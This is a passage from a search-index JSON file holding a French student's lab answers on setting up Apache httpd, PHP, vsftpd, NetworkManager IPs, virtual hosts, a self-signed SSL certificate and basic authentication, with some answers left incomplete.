Apache est fonctionnel ?","text":"<p>La commande permettant de v\u00e9rifier si apache est fonctionnel : <pre><code>sudo systemctl status httpd\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#e-quelles-informations-essentielles-vous-sont-fournies-par-cette-commande","title":"e) Quelles informations essentielles vous sont fournies par cette commande ?","text":"<pre><code>-L'\u00e9tat du servce (loaded)\n-Activit\u00e9 : active ou inactive\n-Docs man:httpd.service(8)\n</code></pre>"},{"location":"cours-TP/C_Systems/tp1/tp1/#5-configuration-du-service-apache","title":"5- Configuration du service Apache","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-ou-se-trouvent-les-fichiers-de-configuration-de-apache","title":"a) Ou se trouvent les fichiers de configuration de Apache ?","text":"<p>Les fichiers de configurations d'Apache sont dans :* <pre><code>/etc/httpd\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-quelle-est-la-structure-de-ce-repertoire","title":"b) Quelle est la structure de ce r\u00e9pertoire ?","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#c-ou-se-trouve-le-fichier-de-configuration-principal","title":"c) Ou se trouve le fichier de configuration principal ?","text":"<p>Le fichier de configuration principal se trouve : <pre><code>/etc/httpd/conf/httpd.conf\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-que-contient-du-point-de-vue-logique-le-repertoire-confd","title":"d) Que contient (du point de vue logique) le r\u00e9pertoire conf.d","text":"<p>Le repertoire conf.d contient des fichier de configuration suppl\u00e9mentaire tel que la configuration d'un virtualhost :  r\u00e9f\u00e9rence</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#eque-contient-le-repertoire-confmodulesd","title":"e)Que contient le r\u00e9pertoire conf.modules.d","text":"<p>Le repertoire conf.modules.d contient :  </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#f-quest-ce-quun-module","title":"f) Qu\u2019est-ce qu\u2019un module ?","text":"<p>Un module est une extension qui ajoute des fonctionnalit\u00e9s \u00e0 Apache.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#g-ou-sont-ils-stockes","title":"g) Ou sont-ils stock\u00e9s ?","text":"<p>Ils sont stock\u00e9s dans :  <pre><code>/usr/lib64/httpd/modules/\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#h-ou-sont-stockes-les-log-de-apache","title":"h) Ou sont stock\u00e9s les log de Apache ?","text":"<p>Les logs par d\u00e9fauts sont stock\u00e9s dans :  <pre><code>/var/log/httpd/\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#6-exploration-de-la-configuration-de-base-fichier-httpdconf","title":"6- Exploration de la configuration de base (fichier httpd.conf)","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-quest-ce-que-le-document-root","title":"a) Qu\u2019est ce que le \u2018DOCUMENT ROOT\u2019 ?","text":"<p>Le Document Root est le r\u00e9pertoire racine du serveur web</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-sur-quel-repertoire-pointe-t-il","title":"b) Sur quel r\u00e9pertoire pointe-t-il ?","text":"<p>Il point sur : <pre><code>/var/www/html\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-a-quoi-sert-la-directive-listen","title":"c) A quoi sert la directive \u2018Listen\u2019","text":"<p>La directive 'Listen' permet de savoir sur quel port et IP le serveur web doit \u00e9couter les requ\u00eates.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-a-quoi-sert-la-declaration","title":"d) A quoi sert la d\u00e9claration  <p>La d\u00e9claration  permet de d\u00e9finir les r\u00e8gles de configurations pour un repertoire.","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#e-a-quoi-servent-les-directives-allowoverride-et-require","title":"e) A quoi servent les directives \u2018AllowOverride\u2019 et \u2018Require\u2019 ? <ol> <li>AllowOverride<ul> <li>D\u00e9finit si Apache autorise les fichiers .htacces dans le repertoire \u00e0 surcharger certaines directives. </li> </ul> </li> <li>Require <ul> <li>Le ficheir require permet de d\u00e9finir qui peux acc\u00e9der aux fichiers du r\u00e9pertoire.</li> </ul> </li> </ol>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#f-a-quoi-sert-le-fichier-welcomeconf","title":"f) A quoi sert le fichier welcome.conf ? <p>Le fichier <code>welcome.conf</code> permet d'afficher la page d'accueil d'Apache. </p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#g-a-quoi-sert-la-commande-apachectl","title":"g) A quoi sert la commande apachectl ? <p>La commande apachectl est un outil de contr\u00f4le du serveur Apache.</p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#7-tests-et-installations-complementaires","title":"7 - Tests et Installations compl\u00e9mentaires","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-executez-la-commande-yum-install-php-y-quels-packages-sont-installes","title":"a) Ex\u00e9cutez la commande yum install php -y , Quels packages sont install\u00e9s ?","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#ble-service-apache-utilise-desormais-systematiquement-le-package-php-fpm-contenant-les-elements-necessaires-pour-lexecution-de-pages-web-dynamiques-que-contient-ce-package","title":"b)Le service Apache utilise d\u00e9sormais syst\u00e9matiquement le package \u2018php-fpm\u2019 contenant les \u00e9l\u00e9ments n\u00e9cessaires pour l\u2019ex\u00e9cution de pages web dynamiques. Que contient ce package ? <p>Le package php-fpm contient :     -les binaires php.     -la gestion des processus pour le serveur web     -les ficheir de configuration php</p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#c-comment-prouver-que-le-serveur-web-est-desormais-capable-dexecuter-du-php","title":"c) Comment prouver que le serveur Web est d\u00e9sormais capable d\u2019ex\u00e9cuter du PHP ? <p>Pour prouver que le serveur web est capable d'ex\u00e9cuter du PHP, il suffit de cr\u00e9e un fichier <code>info.php</code> dans le repertoire <code>/var/www/html/info.php</code></p> <p>et y mettre  :  <pre><code>&lt;?php\nphpinfo()\n?&gt;\n</code></pre> </p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#d-quelle-version-de-php-est-installee","title":"d) Quelle version de php est install\u00e9e ? <p>La version de php est : </p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#ecomment-connaitre-la-configuration-complete-du-serveur-web-librairies-installees-avec-leurs-versions-et-configurations","title":"e)Comment conna\u00eetre la configuration compl\u00e8te du serveur web (librairies install\u00e9es, avec leurs versions et configurations?) <p>On peut soit regarder sur le info.php que j'ai cr\u00e9e sur l'adresse : http://localhost:8080/info.php Ou alors : via les commandes : <pre><code>php -m #liste les modules\nphp -v #version de php\nphp -i #info d\u00e9taill\u00e9s (ressemble \u00e0 phpinfo())\n\nhttpd -M #module Apache\n</code></pre></p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#f-installez-les-packages-et-donnez-le-role-des-packages-suivants","title":"f)  Installez les packages et donnez le r\u00f4le des packages suivants : <pre><code>-php-gd\n```sudo dnf install php-gd -y```\nPermet \u00e0 php de manipuler des images\n\n-php-mysqlnd\n``` sudo dnf install php-mysqlnd -y ```\nPermet \u00e0 php de se connecter aux BDD Mysql\n\n-php-pdo\n``` sudo dnf install php-pdo -y ```\nPermet de se connecter \u00e0 plusieurs de types de BDD\n\n-php-mbstring\n``` sudo dnf install php-mbstring -y ```\nPermet de g\u00e9rer les chaines de caract\u00e8res UTF8\n</code></pre>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#8-configuration-avancee","title":"8- Configuration avanc\u00e9e","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#ainstallez-le-service-vsftp-et-bien-sur-verifiez-quil-est-operationnel-quavez-vous-fait-comme-commande","title":"a)Installez le service vsftp, et bien s\u00fbr, v\u00e9rifiez qu\u2019il est op\u00e9rationnel. Qu\u2019avez-vous fait comme commande ?","text":"<p>Il faut installer vsftpd : <code>sudo dnf install vsftpd -y</code></p> <p>Demarrer le service et l'activer :  <pre><code>sudo systemctl start vsftpd\nsudo systemctl enable vsftpd\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-creez-un-compte-utilisateur-nomme-web-le-repertoire-de-travail-de-lutilisateur-web-contiendra-les-dossiers-hebergeant-les-differents-sites-web-geres-par-lutilisateur-web","title":"b) Cr\u00e9ez un compte utilisateur nomm\u00e9 \u2018web\u2019. Le r\u00e9pertoire de travail de l\u2019utilisateur \u2018web\u2019 contiendra les dossiers h\u00e9bergeant les diff\u00e9rents sites web g\u00e9r\u00e9s par l\u2019utilisateur \u2018web\u2019 :","text":"<p>Je vais cr\u00e9e l'user 'web' avec son sheel par d\u00e9faut :  <pre><code>sudo useradd -m -s /bin/bash web\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#-un-dossier-wwwcampagnesys-pour-linstance-httpd-virtuel-qui-repondra-aux-requetes-sur-une-ip-serveur-virtuel-par-ip-cf-virtualhost","title":"- un dossier www.campagne.sys pour l\u2019instance httpd virtuel qui r\u00e9pondra aux requ\u00eates sur une IP (serveur virtuel par IP, cf virtualhost)","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#-un-dossier-wwwmontagnesys-et-wwwglaciersys-pour-linstance-httpd-virtuel-qui-repondra-aux-requetes-les-deux-domaines-hebergement-mutualise-cf-web-multi-homing","title":"- un dossier www.montagne.sys et www.glacier.sys pour l\u2019instance httpd virtuel qui r\u00e9pondra aux requ\u00eates les deux domaines (H\u00e9bergement mutualis\u00e9, cf web multi-homing )","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#-un-dossier-wwwsommetsys-pour-tester-la-mise-en-place-dun-serveur-repondant-aux-requetes-https","title":"- un dossier www.sommet.sys pour tester la mise en place d\u2019un serveur r\u00e9pondant aux requ\u00eates https.","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#-donnez-la-liste-des-commandes-utilisees","title":"- Donnez la liste des commandes utilis\u00e9es.","text":"<p>Les quatres dossiers :  <pre><code> sudo mkdir /home/web/www.campagne.sys\nsudo mkdir /home/web/www.montagne.sys\nsudo mkdir /home/web/www.glacier.sys\nsudo mkdir /home/web/www.sommet.sys\n\n\nPuis Changer le propri\u00e9taire : \n\nsudo chown -R web:web /home/web/\n\n\nPuis d\u00e9finir les permissions :\n\nsudo chmod -R 755 /home/web/\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-verifiez-que-vous-pouvez-acceder-en-lectureecriture-a-tous-les-repertoires-presents-dans-le-repertoire-homeweb-en-utilisant-un-client-ftp-comme-filezilla-donnez-les-permissions-de-homeweb-ainsi-que-celles-des-dossiers-precedemment-crees","title":"c) V\u00e9rifiez que vous pouvez acc\u00e9der en lecture/\u00e9criture a tous les r\u00e9pertoires pr\u00e9sents dans le r\u00e9pertoire /home/web en utilisant un client ftp comme FileZilla. Donnez les permissions de /home/web ainsi que celles des dossiers pr\u00e9c\u00e9demment cr\u00e9\u00e9s","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#9-configuration-reseau","title":"9 -  Configuration r\u00e9seau :","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-configurer-votre-carte-reseau-avec-lip-fixe-17218xx516-en-utilisant-nmtui-et-donnez-le-contenu-du-fichier-etcnetworkmanagersystem-connectionsens192nmconnection-ens192-correspond-au-nom-de-la-carte-reseau-elle-peut-changer-selon-le-contexte-de-deploiement-de-la-vm","title":"a) Configurer votre carte r\u00e9seau avec l\u2019IP fixe 172.18.xx.5/16 en utilisant nmtui et donnez le contenu du fichier /etc/NetworkManager/system-connections/ens192.nmconnection (ens192 correspond au nom de la carte r\u00e9seau, elle peut changer selon le contexte de d\u00e9ploiement de la VM)","text":"<p>Je vais d\u00e9tailler \u00e9tape par \u00e9tape :  Lancer l'outil nmtui : <code>sudo nmtui</code> nmtui = Text User Interface for NetworkManager </p> <ol> <li>Selectionner Edit a connection </li> <li>Choisir carte r\u00e9seau</li> <li> Je peux ping 172.18.220.6 et www.sommet.sys </li> </ol>"},{"location":"cours-TP/C_Systems/tp1/tp1/#ba-quoi-sert-la-commande-nmcli","title":"b)A quoi sert la commande nmcli","text":"<p>La commande <code>nmcli</code> est l'interface en ligne de commande NetworkManager     - Elle permet de cr\u00e9e modifier supprimer des connexions r\u00e9seaux     - Afficher l'\u00e9tat des interfaces     - Configurer des Ip statiques et dynamiques </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-a-quoi-sert-la-commande-nmcli","title":"c) A quoi sert la commande nmcli","text":"<p>Le service NetworkManager est un service syst\u00e8me qui g\u00e8re les connexions r\u00e9seau sur Linux.     -La d\u00e9tection automatique des interfaces     -La configuration Ip      -La gestion de DNS</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-a-quoi-sert-le-fichier-etcresolvconf","title":"d) A quoi sert le fichier /etc/resolv.conf ?","text":"<p>Ce fichier contient les serveurs DNS </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#e-que-devez-vous-faire-comme-tests-pour-verifier-la-connectivite-de-votre-vm","title":"e) Que devez-vous faire comme tests pour v\u00e9rifier la connectivit\u00e9 de votre VM ?","text":"<pre><code>ping 172.18.255.254\nping 8.8.8.8\n\ncurl http://www.free.fr\n</code></pre>"},{"location":"cours-TP/C_Systems/tp1/tp1/#f-votre-machine-peut-elle-joindre-wwwfreefr-quelle-commande-avez-vous-utilisez-pour-le-verifier","title":"f)  Votre machine peut-elle joindre www.free.fr ? Quelle commande avez vous utilisez pour le v\u00e9rifier ?","text":"<p>Oui  : </p> <p></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#g-votre-vm-peut-elle-etre-jointe-par-lun-de-vos-collegues-si-non-pourquoi-quels-tests-avez-vous-effectues","title":"g)  Votre VM peut-elle \u00eatre jointe par l\u2019un de vos coll\u00e8gues ? Si non, pourquoi ? Quels tests avez-vous effectu\u00e9s ?","text":"<p>Je ne sais pas je n'ai pas pu tester.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#10-ip-virtuelles-pour-les-serveurs-virtuels-par-ip-et-no-multi-homing","title":"10 - IP Virtuelles pour les serveurs virtuels par Ip et No (multi-homing) <p>Pour www.campagne.sys : IP = 172.18.220.6:8086  http://www.campagne.sys:8086 </p> <p>Pour www.sommet.sys : IP = 172.18.220.15:8087 http://www.sommet.sys:8087 </p> <p>Pour www.montagne.sys : IP = 172.18.220.10:8081 http://www.montagne.sys:8081 </p> <p>Pour www.glacier.sys : IP = 172.18.220.10:8081 http://www.glacier.sys:8081 </p>","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-ajouter-trois-adresses-ip-virtuelles-en-utilisant-nmtu","title":"a) Ajouter trois adresses IP virtuelles en utilisant nmtu","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#17218xx616-permettant-de-contacter-le-site-web-wwwcampagnesys","title":"172.18.xx.6/16 permettant de contacter le site web www.campagne.sys","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#17218xx1016-permettant-de-joindre-wwwmontagnesys-et-wwwglaciersys","title":"172.18.xx.10/16 permettant de joindre www.montagne.sys et www.glacier.sys","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#17218xx1516-permettant-de-joindre-wwwsommetsys","title":"172.18.xx.15/16 permettant de joindre www.sommet.sys","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#donnez-le-contenu-des-3-fichiers-de-configuration","title":"Donnez le contenu des 3 fichiers de configuration :","text":"<p>Config 1 : campagne (/etc/NetworkManager/system-connections/campagne.nmconnection) </p> <p>Config 2 : montagne (/etc/NetworkManager/system-connections/montagne.nmconnection) </p> <p>Config 3 : sommet (/etc/NetworkManager/system-connections/sommet.nmconnection) </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-comment-prouver-que-votre-configuration-est-fonctionnelle","title":"b) Comment prouver que votre configuration est fonctionnelle ?","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#11-configuration-du-premier-serveur-virtuel-serveur-virtuel-par-ip","title":"11 - Configuration du premier serveur virtuel : serveur virtuel par IP","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#acreez-le-premier-serveur-web-virtuel-la-racine-documentroot-de-ce-serveur-web-sera-bien-sur-le-repertoire-wwwcampagnesys-donnez-le-nom-et-le-contenu-du-fichier-de-configuration","title":"a)Cr\u00e9ez le premier serveur web virtuel. La racine (DocumentRoot) de ce serveur web sera bien s\u00fbr le r\u00e9pertoire www.campagne.sys. Donnez le nom et le contenu du fichier de configuration.","text":"<p>Voici le virtual host :  <pre><code>/etc/httpd/conf.d/campagne.conf\n&lt;VirtualHost 172.18.220.6:80&gt;\n    ServerName www.campagne.sys\n    DocumentRoot /home/web/www.campagne.sys\n\n    &lt;Directory /home/web/www.campagne.sys&gt;\n        Options Indexes FollowSymLinks\n        AllowOverride None\n        Require all granted\n    &lt;/Directory&gt;\n\n    ErrorLog /var/log/httpd/campagne_error.log\n    CustomLog /var/log/httpd/campagne_access.log combined\n&lt;/VirtualHost&gt;\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#bprouvez-que-votre-serveur-virtuel-est-a-lecoute-et-joignable-depuis-une-machine-presente-sur-le-reseau-labovm-quelle-est-votre-demarche","title":"b)Prouvez que votre serveur virtuel est a l\u2019\u00e9coute et joignable depuis une machine pr\u00e9sente sur le r\u00e9seau LaboVM. Quelle est votre d\u00e9marche ?","text":"<p>Dans un premier temps, il faut regarder le status de httpd   On le voit \"active\"</p> <p>Puis regarder si le port 80 est ouvert sur 172.18.220.6 :   On le voit sur \"*\".</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#rajout-important","title":"RAJOUT Important !!!","text":"<p>J'ai eu un probl\u00e8me j'ai donc rajout\u00e9 un tunnel :   Sur le port 81 j'ai mis campagne  Dans son virtual host : <code>/etc/httpd/conf.d/campagne.conf</code> Et dans la conf httpd :   Dans le fichier <code>/etc/httpd/conf/httpd.conf</code></p> <p>Mais je ne sais pas si c'est bon.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-testez-votre-configuration-en-utilisant-votre-navigateur-depuis-votre-windows-ou-depuis-une-autre-vm-pouvez-vous-prouver-que-cest-bien-le-serveur-virtuel-que-vous-venez-de-configurer-qui-a-repondu-comment","title":"c) Testez votre configuration en utilisant votre navigateur (depuis votre Windows ou depuis une autre VM). Pouvez-vous prouver que c\u2019est bien le serveur virtuel que vous venez de configurer qui a r\u00e9pondu ? Comment ?","text":"<p>Voici la page campagne :  </p> <p>Pour prouver il y a le texte simplement qui est diff\u00e9rents de celui du port 8080.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-votre-serveur-vous-a-retourne-un-message-access-denied-cest-probablement-normal-pourtant-vous-avez-prouve-quil-etait-a-lecoute","title":"d) Votre serveur vous a retourn\u00e9 un message \u00ab access denied \u00bb ? C\u2019est probablement normal, pourtant vous avez prouv\u00e9 qu\u2019il \u00e9tait a l\u2019\u00e9coute :","text":"<pre><code>-Le \"Allow\" permet de controler qui peut acceder au repertoire\n-Les permissions sont : ![alt text](image-22.png)\n- Il faut mettre cela en directive Apache en guise de solution propre :\n</code></pre> <p><code>&lt;Directory /home/web/www.campagne.sys&gt;     Require all granted &lt;/Directory&gt;</code></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#e-deployez-lapplication-web-phpsysinfo-httpphpsysinfogithubiophpsysinfo-dans-le-repertoire-wwwcampagnesys-et-fournissez-une-copie-decran-de-la-page-daccueil-de-cette-application","title":"e) D\u00e9ployez l\u2019application web phpsysinfo (http://phpsysinfo.github.io/phpsysinfo/) dans le r\u00e9pertoire www.campagne.sys et fournissez une copie d\u2019\u00e9cran de la page d\u2019accueil de cette application.","text":"<p>Voici l'application web phpsysinfo sur l'address http://localhost:8181 </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#ebis-testez-lurl-http17218xx5-avez-vous-obtenu-une-reponse-si-oui-pourquoi","title":"ebis) Testez l\u2019URL http://172.18.xx.5 Avez vous obtenu une r\u00e9ponse ? Si Oui pourquoi ?","text":"<p>Je n'obtiens rien sur http://172.18.220.5/ J'ai cr\u00e9e un port 8085 pour loger la page.  </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#12-serveur-virtuel-par-nom","title":"12 - Serveur virtuel par nom","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-creer-les-deux-serveurs-web-virtuels-repondant-pour-le-domaine-wwwmontagnesys-et-wwwglaciersys-sur-lip-17218xx10-et-donnez-le-contenu-dudes-fichiers-de-configuration","title":"a) Cr\u00e9er les deux serveurs web virtuels r\u00e9pondant pour le domaine www.montagne.sys et www.glacier.sys sur l\u2019IP 172.18.xx.10 et donnez le contenu du/des fichier\u00b7s de configuration.","text":"<p>Dans le fichier de conf : <code>/etc/httpd/conf.d/montagne_glacier.conf</code></p> <p>J'ai mis : </p> <pre><code>&lt;VirtualHost 172.18.220.10:80&gt;\n    ServerName www.montagne.sys\n    DocumentRoot /home/web/www.montagne.sys\n\n    &lt;Directory /home/web/www.montagne.sys&gt;\n        Require all granted\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n\n&lt;VirtualHost 172.18.220.10:80&gt;\n    ServerName www.glacier.sys\n    DocumentRoot /home/web/www.glacier.sys\n\n    &lt;Directory /home/web/www.glacier.sys&gt;\n        Require all granted\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-avez-vous-vu-la-note-concernant-la-configuration-des-dns-donnez-en-un-resume","title":"b) Avez vous vu la note concernant la configuration des DNS ? Donnez-en un r\u00e9sum\u00e9","text":"<p>La documentation indique que pour que les serveurs virtuels par nom fonctionnent :</p> <pre><code>- Le client doit envoyer le nom de domaine dans l\u2019en-t\u00eate HTTP (Host:)\n\n- Cela n\u00e9cessite que le nom de domaine soit r\u00e9solu (via DNS ou fichier hosts)\n\nSinon, Apache ne peut pas savoir quel vhost servir\n</code></pre>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-mettez-en-place-une-solution-permettant-de-garantir-que-le-serveur-virtuel-hebergeant-wwwmontagnesys-est-bien-le-bon-a-repondre-et-procedez-aux-tests-justifiez-votre-demarche","title":"c) Mettez en place une solution permettant de garantir que le serveur virtuel h\u00e9bergeant www.montagne.sys est bien le bon a r\u00e9pondre et proc\u00e9dez aux tests. Justifiez votre d\u00e9marche.","text":"<p>C'est bien www.montagne.sys qui r\u00e9pond :   et le fichier de conf : </p> <p></p> <p>Sur le tunnel j'ai fais en sorte que l'IP de montagne soit reli\u00e9 au port 8081 donc le lien sera http://www.montagne.sys:8081 J'ai aussi modifi\u00e9 mon /etc/hosts pour mettre www.montagne.sys reconnu.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-testez-lurl-http17218xx5-quel-serveur-virtuel-a-repondu-est-ce-le-comportement-attendu-justifiez-votre-reponse","title":"d) Testez l\u2019URL http://172.18.xx.5 . Quel serveur virtuel a r\u00e9pondu ? Est-ce le comportement attendu ? Justifiez votre r\u00e9ponse.","text":"<p>Le serveur qui a r\u00e9pondu est le premier VirtualHost d\u00e9fini dans la configuration Apache sur l\u2019IP 172.18.220.5 Car apache utilise le premier d\u00e9fini si il n'y aucune autre justification</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#e-avez-vous-vu-la-note-intitulee-le-serveur-principal-disparait-quelle-information-essentielle-contient-elle","title":"e) Avez vous vu la note intitul\u00e9e \u00ab Le serveur principal dispara\u00eet \u00bb ? Quelle information essentielle contient-elle ?","text":"<p>Cette note indique qu\u2019une fois des VirtualHosts configur\u00e9s, Apache ne sert plus automatiquement le serveur principal. Il faut d\u00e9finir un VirtualHost par d\u00e9faut si l\u2019on souhaite qu\u2019il r\u00e9ponde en l\u2019absence de correspondance explicite.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#13-serveur-virtuel-https-et-ssl","title":"13 - Serveur virtuel, HTTPS et SSL","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-avez-vous-verifie-que-le-module-necessaire-a-lutilisation-du-https-etait-installe-et-charge-quel-est-le-nom-du-module-quavez-vous-fait-pour-verifier-quil-etait-charge-en-memoire-par-apache","title":"a)  Avez vous v\u00e9rifi\u00e9 que le module n\u00e9cessaire a l\u2019utilisation du HTTPS \u00e9tait install\u00e9 et charg\u00e9 ? Quel est le nom du module ? qu\u2019avez vous fait pour v\u00e9rifier qu\u2019il \u00e9tait charg\u00e9 en m\u00e9moire par Apache ?","text":"<pre><code>sudo dnf install mod_ssl\napachectl -M | grep ssl\n</code></pre>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b","title":"b)","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#-a-quoi-sert-loption-x509","title":"- A quoi sert l\u2019option \u00ab -x509 \u00bb","text":"<p>g\u00e9n\u00e8re un certificat auto-sign\u00e9 (non issu d\u2019une autorit\u00e9)</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#-a-quoi-sert-le-parametre-rsa1024-de-loption-newkey-ce-parametre-est-il-pertinent-a-lheure-actuelle","title":"- A quoi sert le param\u00e8tre \u00ab rsa:1024 \u00bb de l\u2019option \u00ab -newkey \u00bb ? Ce param\u00e9tre est-il pertinent a l\u2019heure actuelle ?","text":"<p>g\u00e9n\u00e8re une cl\u00e9 RSA de 1024 bits </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#-quels-sont-les-fichiers-generes-que-contiennent-ils","title":"- Quels sont les fichiers g\u00e9n\u00e9r\u00e9s ? Que contiennent-ils ?","text":"<p>serveur.cle : cl\u00e9 priv\u00e9e (chiffrement) certificat.pem : certificat public (identit\u00e9 du serveur)</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-mettez-en-place-le-serveur-virtuel-wwwsommetsys-il-devra-repondre-sur-les-ports-80-et-443-et-donnez-le-contenu-du-fichier-de-configuration","title":"c) Mettez en place le serveur virtuel www.sommet.sys Il devra r\u00e9pondre sur les ports 80 et 443, et donnez le contenu du fichier de configuration.","text":"<p> Sur le port 80 :  Sur le port 443 : </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-quel-message-avez-vous-obtenu-lors-de-vos-tests-avec-votre-navigateur-pourquoi-avez-vous-obtenu-ce-message","title":"d) Quel message avez-vous obtenu lors de vos tests avec votre navigateur ? Pourquoi avez vous obtenu ce message ?","text":"<p>Message : Avertissement de s\u00e9curit\u00e9 (certificat non reconnu)  Cause : Le certificat est auto-sign\u00e9, donc non valid\u00e9 par une autorit\u00e9 de certification.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#econnaissez-vous-le-site-lets-encrypt-httpsletsencryptorgfr-quel-est-son-role-comment-peut-il-vous-aidez-pour-le-probleme-precedent","title":"e)Connaissez vous le site Let\u2019s Encrypt (https://letsencrypt.org/fr/). Quel est son r\u00f4le ? Comment peut-il vous aidez pour le probl\u00e8me pr\u00e9c\u00e9dent ?","text":"<p>R\u00f4le : Fournit des certificats SSL gratuits et reconnus  Utilit\u00e9 : Permet d\u2019\u00e9viter les avertissements de s\u00e9curit\u00e9 en g\u00e9n\u00e9rant des certificats valides via certbot.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#14-restriction-de-lacces-utilisateur","title":"14 - Restriction de l\u2019acc\u00e8s utilisateur","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-quels-sont-les-modes-dauthentification-possibles","title":"a)  Quels sont les modes d\u2019authentification possibles?","text":"<ol> <li>Basic</li> <li>Digest</li> <li>LDAP</li> <li>Kerberos</li> <li>OAuth/OpenID</li> <li>Fichier .htpasswd</li> </ol>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-quest-ce-quun-fournisseur-dacces-dans-ce-contexte","title":"b) Qu\u2019est ce qu\u2019un fournisseur d\u2019acc\u00e8s dans ce contexte?","text":"<p>D\u00e9finition : Source des identifiants utilis\u00e9s pour l\u2019authentification (ex. fichier .htpasswd, base LDAP\u2026)</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-pour-le-site-wwwcampagnesys-creer-un-repertoire-secure-et-verifier-que-vous-pouvez-bien-acceder-au-contenu-de-ce-repertoire-quels-tests-avez-vous-effectues","title":"c) Pour le site www.campagne.sys, cr\u00e9er un r\u00e9pertoire \u00ab secure \u00bb et v\u00e9rifier que vous pouvez bien acc\u00e9der au contenu de ce r\u00e9pertoire. Quels tests avez-vous effectu\u00e9s ?","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#d-changer-la-configuration-de-ce-serveur-virtuel-pour-restreindre-lacces-au-repertoire-secure-vous-utiliserez-une-authentification-basic-avec-un-provider-file-donnez-le-contenu-du-fichier-de-configuration","title":"d) Changer la configuration de ce serveur virtuel pour restreindre l\u2019acc\u00e8s au r\u00e9pertoire \u00ab secure \u00bb. Vous utiliserez une authentification \u00ab basic \u00bb avec un \u00ab provider file\u00bb. Donnez le contenu du fichier de configuration.","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#e-creez-un-utilisateur-apache-avec-les-identifiants-leon123aze-et-verifiez-quil-a-bien-acces-au-repertoire-secure-la-commande-htpasswd-vous-sera-necessaire-quels-tests-avez-vous-effectues-quelles-commandes-avez-vous-utilisees","title":"e) Cr\u00e9ez un utilisateur \u00ab Apache \u00bb avec les identifiants \u00ab leon/123+aze \u00bb et v\u00e9rifiez qu\u2019il a bien acc\u00e8s au r\u00e9pertoire \u00ab secure \u00bb . La commande htpasswd vous sera n\u00e9cessaire. Quels tests avez-vous effectu\u00e9s ? Quelles commandes avez-vous utilis\u00e9es ?","text":"<pre><code>sudo htpasswd -c /etc/httpd/.htpasswd leon\nmdp 